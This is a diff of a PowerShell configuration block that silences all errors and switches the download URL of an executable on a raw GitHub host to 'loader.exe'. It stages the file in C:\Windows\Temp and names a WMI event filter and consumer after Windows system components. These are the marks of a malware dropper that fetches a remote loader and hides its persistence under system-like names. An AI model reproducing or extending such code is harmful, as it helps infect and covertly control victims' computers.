@@ -1,7 +1,7 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # ===== Konfigurasi =====
-$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/noobs.exe'
+$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/loader.exe'
 $temp = 'C:\Windows\Temp\ldr.exe'
 $filterName = 'Microsoft-Windows-SystemSecurity'
 $consumerName = 'WindowsSystemMaintenance'
